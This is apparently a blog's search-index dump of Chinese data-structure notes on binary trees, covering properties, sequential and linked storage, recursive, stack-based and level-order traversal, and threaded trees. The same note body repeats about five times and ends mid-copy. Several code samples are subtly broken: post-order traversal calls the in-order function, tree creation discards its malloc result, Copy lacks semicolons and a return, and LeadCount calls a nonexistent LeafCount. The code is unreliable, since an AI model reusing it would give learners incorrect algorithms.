完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#满二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#完全二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#完全二叉树性质"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉树的存储结构"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序存储"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 